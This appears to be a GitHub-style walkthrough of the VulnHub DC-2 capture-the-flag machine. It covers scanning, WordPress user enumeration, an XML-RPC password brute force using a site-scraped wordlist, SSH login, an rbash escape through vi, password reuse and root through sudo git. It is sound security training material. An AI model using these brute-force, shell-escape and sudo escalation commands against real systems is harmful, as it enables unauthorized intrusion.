# 🚩 VulnHub — DC-2 CTF Walkthrough

![Platform](https://img.shields.io/badge/Platform-VulnHub-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner-green)
![OS](https://img.shields.io/badge/OS-Linux%20Debian-orange)
![Flags](https://img.shields.io/badge/Flags-5-red)

> A beginner-friendly walkthrough of the DC-2 machine from VulnHub.  
> This writeup covers every step — from recon to root — with explanations of **why** each step was taken.

---

## 📌 Table of Contents

1. [Machine Info](#machine-info)
2. [Tools Used](#tools-used)
3. [Attack Flow Overview](#attack-flow-overview)
4. [Step 0 — Setup /etc/hosts](#step-0--setup-etchosts)
5. [Step 1 — Reconnaissance (Nmap)](#step-1--reconnaissance-nmap)
6. [Step 2 — Web Enumeration (WPScan + Gobuster)](#step-2--web-enumeration-wpscan--gobuster)
7. [Step 3 — Build Custom Wordlist (CeWL)](#step-3--build-custom-wordlist-cewl)
8. [Step 4 — Brute Force WordPress Credentials](#step-4--brute-force-wordpress-credentials)
9. [Step 5 — SSH Login](#step-5--ssh-login)
10. [Step 6 — Escape Restricted Shell (rbash)](#step-6--escape-restricted-shell-rbash)
11. [Step 7 — Lateral Movement (tom → jerry)](#step-7--lateral-movement-tom--jerry)
12. [Step 8 — Privilege Escalation (git → root)](#step-8--privilege-escalation-git--root)
13. [Step 9 — Final Flag](#step-9--final-flag)
14. [Flags Summary](#flags-summary)
15. [Key Lessons Learned](#key-lessons-learned)

---

## Machine Info

| Field | Details |
|-------|---------|
| **Name** | DC-2 |
| **Platform** | VulnHub |
| **Difficulty** | Beginner |
| **OS** | Linux (Debian Jessie) |
| **IP** | 192.168.0.131 *(your IP may differ)* |
| **Goal** | Find all 5 flags and get root |
| **Download** | [VulnHub DC-2](https://www.vulnhub.com/entry/dc-2,311/) |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service detection |
| `wpscan` | WordPress enumeration and brute force |
| `gobuster` | Directory and file enumeration |
| `cewl` | Custom wordlist generation from website |
| `hydra` | SSH brute force (optional) |
| `vi` | rbash escape |
| `GTFOBins` | Privilege escalation reference |

---

## Attack Flow Overview

```
Nmap Scan
    ↓
Discover: Port 80 (WordPress) + Port 7744 (SSH)
    ↓
Fix /etc/hosts → resolve dc-2
    ↓
WPScan → find users: admin, jerry, tom
    ↓
CeWL → build wordlist from site content
    ↓
WPScan brute force → jerry:adipiscing / tom:parturient
    ↓
SSH login as tom (port 7744)
    ↓
rbash escape via vi → :set shell=/bin/sh → :shell
    ↓
Fix PATH → su jerry (password reuse)
    ↓
sudo -l → git NOPASSWD
    ↓
GTFOBins git exploit → ROOT ✅
    ↓
cat /root/final-flag.txt 🏆
```

---

## Step 0 — Setup /etc/hosts

### Why?
Nmap revealed that port 80 redirects to `http://dc-2/` instead of the IP address.  
Without this fix, your browser can't resolve the hostname and the site won't load.

```bash
echo "192.168.0.131  dc-2" | sudo tee -a /etc/hosts
```

### Verify it works:
```bash
curl -I http://dc-2/
# Should return HTTP/1.1 200 OK
```

> 💡 **Why `tee` instead of `>>`?**  
> `/etc/hosts` is root-owned. `sudo echo >> file` fails because the shell redirect runs as your user, not root. `sudo tee -a` runs as root and safely appends.

---

## Step 1 — Reconnaissance (Nmap)

### Goal
Find open ports, running services, and their versions.

### Command
```bash
nmap -Pn -sV -sC -p- 192.168.0.131
```

| Flag | Meaning |
|------|---------|
| `-Pn` | Skip ping — assume host is up |
| `-sV` | Detect service versions |
| `-sC` | Run default scripts |
| `-p-` | Scan all 65535 ports |

### Output (Key Findings)
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 (Debian)
7744/tcp open  ssh     OpenSSH 6.7p1
```

### What this tells us

| Port | Service | Finding |
|------|---------|---------|
| 80 | Apache 2.4.10 | Web server → investigate further |
| 7744 | OpenSSH 6.7p1 | SSH on non-default port → login target |

> ⚠️ **SSH is on port 7744, NOT the default 22** — easy to miss without a full port scan.

---

## Step 2 — Web Enumeration (WPScan + Gobuster)

### 2a — Identify CMS with WPScan

```bash
wpscan --url http://dc-2/ --enumerate u,vp,vt --plugins-detection aggressive
```

### Key Findings

```
[+] WordPress version 4.7.10 (Insecure, released 2018)
[+] XML-RPC enabled: http://dc-2/xmlrpc.php
[+] Users found:
    - admin
    - jerry
    - tom
```

### Why these findings matter

| Finding | Why It Matters |
|---------|---------------|
| WordPress 4.7.10 | Outdated → known vulnerabilities |
| XML-RPC enabled | Allows bulk brute force → faster cracking |
| 3 users found | Targets for brute force |

### 2b — Directory Enumeration with Gobuster

```bash
gobuster dir -u http://dc-2/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html
```

### Key Findings
```
/wp-login.php    (Status: 200)
/wp-admin        (Status: 301)
/xmlrpc.php      (Status: 405)
/wp-content      (Status: 301)
```

> 💡 **How WPScan finds usernames:**  
> WordPress leaks usernames through RSS feeds, the JSON API (`/wp-json/wp/v2/users/`), and author pages (`/?author=1`). Always enumerate users before brute forcing.

---

## Step 3 — Build Custom Wordlist (CeWL)

### Why not use rockyou.txt?
rockyou.txt has 14 million passwords. DC-2 passwords are **hidden in the site's own content** — CeWL scrapes them directly, making cracking much faster.

```bash
cewl http://dc-2/ -w dc2-wordlist.txt
```

### What CeWL does
```
Crawls http://dc-2/
    ↓
Extracts all unique words from page content
    ↓
Saves to dc2-wordlist.txt
```

### Save users to file
```bash
echo -e "admin\njerry\ntom" > users.txt
```

> 💡 **Rule:** Always generate a CeWL wordlist from the target site before falling back to rockyou.

---

## Step 4 — Brute Force WordPress Credentials

### Using XML-RPC (Faster)
XML-RPC allows multiple password attempts per HTTP request — much faster than wp-login.

```bash
wpscan --url http://dc-2/ \
  -U users.txt \
  -P dc2-wordlist.txt \
  --password-attack xmlrpc \
  -t 10 \
  --verbose
```

### Results 🎯
```
[SUCCESS] jerry : adipiscing
[SUCCESS] tom   : parturient
```

> ⚠️ `admin` password was not in the CeWL wordlist — but we don't need it.

---

## Step 5 — SSH Login

### Try both users on SSH (port 7744)

```bash
# Try tom first
ssh tom@192.168.0.131 -p 7744
# Password: parturient

# Try jerry
ssh jerry@192.168.0.131 -p 7744
# Password: adipiscing
```

### Results
```
tom   → SSH login SUCCESS ✅ (but restricted shell)
jerry → SSH login FAILED ❌ (WP password doesn't work for SSH)
```

> 💡 Credentials don't always reuse across services — always try both.

---

## Step 6 — Escape Restricted Shell (rbash)

### How to identify rbash
```bash
echo $SHELL
# output: /bin/rbash

cat flag3.txt
# -rbash: cat: command not found
```

### Check what commands are allowed
```bash
ls ~/usr/bin/
# output: less  ls  scp  vi
```

### Escape via vi
```bash
vi flag3.txt
```

Inside vi, type:
```
:set shell=/bin/sh
:shell
```

### Fix PATH after escape
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH
```

### Verify escape worked
```bash
echo $SHELL    # /bin/sh
id             # uid=1001(tom)
cat ~/flag3.txt
```

### Flag 3 Contents
```
Poor old Tom is always running after Jerry.
Perhaps he should su for all the stress he causes.
```

> 💡 **Hint decoded:** "su for all the stress" → `su jerry` → switch to jerry user.

> 💡 **rbash escape logic:** Check allowed commands → match to GTFOBins → `vi` has `:shell` → escape. Always fix PATH after escaping.

---

## Step 7 — Lateral Movement (tom → jerry)

### Switch to jerry using WordPress password
```bash
su jerry
# Password: adipiscing
```

### Result
```
jerry@DC-2:~$ id
uid=1000(jerry) gid=1000(jerry) groups=1000(jerry)
```

### Read Flag 4
```bash
cat flag4.txt
```
```
Good to see that you've made it this far - but you're not home yet.
You still need to get the final flag (the only flag that really counts!!!).
No hints here - you're on your own now. :-)
Go on - git outta here!!!!
```

> 💡 **Hint decoded:** "git outta here" → check sudo permissions for `git`.

---

## Step 8 — Privilege Escalation (git → root)

### Check sudo permissions
```bash
sudo -l
```

### Output
```
User jerry may run the following commands on DC-2:
    (root) NOPASSWD: /usr/bin/git
```

### What this means
```
(root)    → runs as root
NOPASSWD  → no password needed
/usr/bin/git → only this binary
```

### Exploit via GTFOBins

Reference: [https://gtfobins.github.io/gtfobins/git/](https://gtfobins.github.io/gtfobins/git/)

```bash
sudo git log --help
```

Inside the pager (less), type:
```
!/bin/bash
```

### Result
```
root@DC-2:/home/jerry#
```

> 💡 **Why this works:**  
> `git log --help` opens a man page in `less` pager — running as root.  
> Inside less, `!command` executes a shell command.  
> `!/bin/bash` spawns bash as root. ✅

---

## Step 9 — Final Flag

```bash
cat /root/final-flag.txt
```

```
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/

Congratulations!!!
A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly appreciated.
If you enjoyed this CTF, send me a tweet via @DCAU7.
```

## 🏆 DC-2 Rooted!

---

## Flags Summary

| Flag | Location | How Found |
|------|---------|-----------|
| Flag 1 | WordPress page (hidden) | Browse site after login |
| Flag 2 | WordPress admin panel | Login as jerry/tom |
| Flag 3 | `/home/tom/flag3.txt` | SSH + rbash escape + vi |
| Flag 4 | `/home/jerry/flag4.txt` | su jerry after escape |
| Flag 5 | `/root/final-flag.txt` | Root via git sudo exploit |

---

## Key Lessons Learned

### 1. Always Do Full Port Scans
```bash
nmap -Pn -p- <target>   # scan ALL ports
```
SSH was hiding on port 7744 — not default 22.

### 2. CeWL Before rockyou
Custom wordlists built from the target site are faster and more effective for CTFs and real engagements.

### 3. Check Allowed Commands in rbash
```bash
ls ~/usr/bin/     # what can I run?
```
Match to GTFOBins → find escape technique.

### 4. sudo -l is Always First
```bash
sudo -l    # run this immediately after every shell
```
This single command found the path to root.

### 5. Password Reuse Across Users
WordPress credentials worked for SSH (tom) and `su` (jerry). Always try found passwords everywhere.

### 6. Read Every Hint
DC-2 hid the next step in every flag:
```
Flag 3 → "su for the stress"  → su jerry
Flag 4 → "git outta here"     → sudo git exploit
```

---

## Useful Resources

| Resource | URL | Use |
|----------|-----|-----|
| GTFOBins | https://gtfobins.github.io | sudo/SUID escalation |
| HackTricks | https://book.hacktricks.xyz | rbash escape techniques |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | All payloads reference |
| WPScan | https://wpscan.com | WordPress scanning |
| VulnHub DC-2 | https://www.vulnhub.com/entry/dc-2,311/ | Machine download |

---

## Author

> Walkthrough by **rio1**  
> Tools: Kali Linux | Target: VulnHub DC-2  
> *"Hack to learn, not learn to hack."*

---

*If this helped you, give it a ⭐ on GitHub!*
